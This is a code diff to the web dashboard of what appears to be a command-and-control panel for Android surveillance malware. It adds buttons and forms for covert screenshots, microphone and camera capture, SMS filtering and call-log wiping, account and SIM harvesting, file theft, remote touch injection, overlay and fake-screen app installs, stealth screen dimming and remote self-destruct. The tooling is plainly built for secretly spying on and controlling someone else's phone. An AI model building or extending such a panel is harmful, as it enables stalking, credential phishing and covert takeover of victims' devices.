+                    { id: 'SET_SMS_BLACKLIST', name: 'SMS Stealth Filter', icon: '🛡️', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
+                    { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
+                    { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] }
+                ]
+            },
+            {
+                id: 'surv', 
+                label: 'Active Surveillance', 
+                css: 'surv', 
+                search: 'camera, mic, snapshot, audio, recording, screenshot, eyes, ears, environment, sensors',
+                commands: [
+                    { id: 'GET_SCREENSHOT', name: 'Capture Screen', icon: '📸', inputs: [{id: 'scr-quality', label: 'Quality %', type: 'number', val: 70}, {id: 'scr-freq', label: 'Freq (0=Single)', type: 'number', val: 0}, {id: 'scr-dur', label: 'Duration (s)', type: 'number', val: 0}] },
+                    { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
+                    { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
+                    { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', inputs: [] },
+                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs: [{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}] }
+                ]
+            },
+            {
+                id: 'remote', 
+                label: 'Remote Interaction', 
+                css: 'sys', 
+                search: 'wake, touch, brightness, screen, dimmer, ui, inject, intent, ghost, chain',
+                commands: [
+                    { id: 'REMOTE_TOUCH', name: 'Execute Touch Chain', icon: '⛓️', inputs: [{id: 'touch-json-raw', label: 'Chain JSON', type: 'textarea'}] },
+                    { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}] },
+                    { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}] },
+                    { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
+                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}] }
+                ]
+            },
+            {
+                id: 'sys_tools', 
+                label: 'System & Identity', 
+                css: 'sys', 
+                search: 'toast, speak, tts, volume, ping, token, accounts, numbers, battery, vitals',
+                commands: [
+                    { id: 'TOAST', name: 'Show Toast Alert', icon: '💬', inputs: [{id: 'val-toast', label: 'Message', type: 'text'}] },
+                    { id: 'SPEAK_TEXT', name: 'Speak Text (TTS)', icon: '🗣️', inputs: [{id: 'speak-text', label: 'Message', type: 'text'}, {id: 'speak-vol', label: 'Volume %', type: 'number', val: 80}] },
+                    { id: 'VOLUME', name: 'Set Audio Volume', icon: '🔊', inputs: [{id: 'vol-stream', label: 'Stream', type: 'select', options: [{v: 'RING', l: 'Ring'}, {v: 'MEDIA', l: 'Media'}, {v: 'ALARM', l: 'Alarm'}]}, {id: 'vol-level', label: 'Level (0-100 / SILENT)', type: 'text'}] },
+                    { id: 'PING', name: 'Send Connection Ping', icon: '📡', inputs: [] },
+                    { id: 'GET_ACCOUNTS', name: 'Fetch Device Accounts', icon: '🆔', inputs: [] },
+                    { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] }
+                ]
+            },
+            {
+                id: 'files', 
+                label: 'Files & Assets', 
+                css: 'sys', 
+                search: 'pull, push, file, skeleton, index, install, deploy, vault',
+                commands: [
+                    { id: 'PUSH_FILE', name: 'Deploy File to Device', icon: '📤', inputs: [{id: 'push-url', label: 'Source URL', type: 'text'}, {id: 'push-path', label: 'Target Path', type: 'text'}] },
+                    { id: 'PULL_FILE', name: 'Download File from Device', icon: '📥', inputs: [{id: 'val-pull', label: 'Remote Path', type: 'text'}] },
+                    { id: 'GET_SKELETON', name: 'Scan File Structure', icon: '🦴', inputs: [{id: 'val-skeleton', label: 'Depth (1-10)', type: 'number', val: 5}] },
+                    { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}] }
+                ]
+            },
+            {
+                id: 'crisis', 
+                label: 'Crisis & Stealth', 
+                css: 'crisis', 
+                search: 'nuke, codered, lock, stop, beacon, panic, red, wipe, uninstall',
+                commands: [
+                    { id: 'CODERED', name: 'Trigger Code Red Loop', icon: '🚨', inputs: [{id: 'cr-code', label: 'Codes', type: 'text', val: '0'}, {id: 'cr-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'cr-freq', label: 'Freq (Sec)', type: 'number', val: 30}] },
+                    { id: 'LOCK_SCREEN', name: 'Force Device Lock', icon: '🔒', inputs: [] },
+                    { id: 'STOP_BEACON', name: 'Dark Mode (Stop Beacon)', icon: '🌑', inputs: [] },
+                    { id: 'NUKE', name: 'Remote Self-Destruct', icon: '☢️', inputs: [] }
+                ]
+            }
+        ];
+
+        function renderCommandDashboard() {
+            const container = document.getElementById('cmd-dashboard-container');
+            container.innerHTML = COMMAND_GROUPS.map(group => `
+                <div class="cat-group" id="cat-${group.id}">
+                    <div class="cat-header ${group.css}" onclick="toggleDashboardCat('${group.id}')" data-search="${group.search}">
+                        <span>${group.label}</span>
+                        <span class="cat-toggle-icon">▼</span>
+                    </div>
+                    <div class="cat-content" id="content-${group.id}">
+                        ${group.commands.map(cmd => `
+                            <div class="cmd-tile" id="tile-${cmd.id}">
+                                <div class="cmd-tile-main" onclick="toggleCmdDrawer('${cmd.id}')">
+                                    <div class="cmd-name"><span style="margin-right:10px">${cmd.icon}</span> ${cmd.name}</div>
+                                    <div style="display:flex; gap:8px;">
+                                        <button class="btn-tag" onclick="tagCmd('${cmd.id}', this); event.stopPropagation();">🏷️</button>
+                                        <button class="btn-status" onclick="auditCmd('${cmd.id}'); event.stopPropagation();">?</button>
+                                    </div>
+                                </div>
+                                <div class="cmd-drawer" id="drawer-${cmd.id}">
+                                    <div class="drawer-inputs">
+                                        ${cmd.inputs.map(input => `
+                                            <div style="margin-bottom:10px;">
+                                                <label style="display:block; font-size:0.6rem; color:var(--primary); margin-bottom:4px;">${input.label}</label>
+                                                ${input.type === 'select' ? `
+                                                    <select id="${input.id}" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:8px;">
+                                                        ${input.options.map(o => `<option value="${o.v}">${o.l}</option>`).join('')}
+                                                    </select>
+                                                ` : input.type === 'textarea' ? `
+                                                    <textarea id="${input.id}" placeholder="${input.placeholder || ''}" style="width:100%; height:80px;"></textarea>
+                                                ` : `
+                                                    <input type="${input.type}" id="${input.id}" value="${input.val !== undefined ? input.val : ''}" placeholder="${input.placeholder || ''}" style="width:100%">
+                                                `}
+                                            </div>
+                                        `).join('')}
+                                    </div>
+                                    <div class="cmd-actions">
+                                        <button class="btn" style="flex:1; background:var(--primary); color:#000;" onclick="sendCmd('${cmd.id}')">BROADCAST</button>
+                                        <button class="btn danger" style="padding:8px 15px;" onclick="toggleCmdDrawer('${cmd.id}')">CANCEL</button>
+                                    </div>
+                                </div>
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function toggleDashboardCat(id) {
+            const content = document.getElementById('content-' + id);
+            const icon = document.querySelector(`#cat-${id} .cat-toggle-icon`);
+            const isOpen = content.classList.contains('open');
+            
+            // Close others if you want accordion behavior, or just toggle
+            content.classList.toggle('open');
+            icon.innerText = isOpen ? '▼' : '▲';
+        }
+
+        function toggleCmdDrawer(id) {
+            const drawer = document.getElementById('drawer-' + id);
+            const isOpen = drawer.classList.contains('open');
+            
+            // Close all other drawers in the same section for cleanliness
+            drawer.closest('.cat-content').querySelectorAll('.cmd-drawer').forEach(d => d.classList.remove('open'));
+            
+            if (!isOpen) drawer.classList.add('open');
+        }
+
         function addTouchStep() {
             const type = document.getElementById('next-step-type').value;
             let val = "";
@@ -713,9 +507,10 @@
 
         window.onload = async () => {
             setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 1000);
+            renderCommandDashboard(); // Setup dynamic UI
             await fetchLatest();
             setInterval(fetchLatest, 5000);
-            fetchFiles(); // Initial load
+            fetchFiles(); 
             initSearchSuggestions();
             refreshTagStates();
         };
@@ -1572,9 +1367,9 @@
                 }
             }
 
-            // 2. Check Static Headers
+            // 2. Check Static Headers & Dashboard Categories
             if (!foundElement) {
-                const headers = document.querySelectorAll('h2[data-search]');
+                const headers = document.querySelectorAll('h2[data-search], .cat-header[data-search]');
                 for (const h of headers) {
                     const keywords = h.getAttribute('data-search').split(',').map(k => k.trim());
                     if (keywords.some(k => k.includes(term)) || h.innerText.toLowerCase().includes(term)) {
@@ -1597,6 +1392,21 @@
                 const section = foundElement.closest('.section');
                 const tabId = section.id.replace('view-', '');
                 switchTab(tabId);
+
+                // If it's a dashboard item, ensure it's expanded
+                if (foundElement.classList.contains('cat-header')) {
+                    const catId = foundElement.parentElement.id.replace('cat-', '');
+                    const content = document.getElementById('content-' + catId);
+                    if (!content.classList.contains('open')) toggleDashboardCat(catId);
+                }
+                
+                const tile = foundElement.closest('.cmd-tile');
+                if (tile) {
+                    const cat = tile.closest('.cat-group');
+                    const catId = cat.id.replace('cat-', '');
+                    const content = document.getElementById('content-' + catId);
+                    if (!content.classList.contains('open')) toggleDashboardCat(catId);
+                }
 
                 setTimeout(() => {
                     foundElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
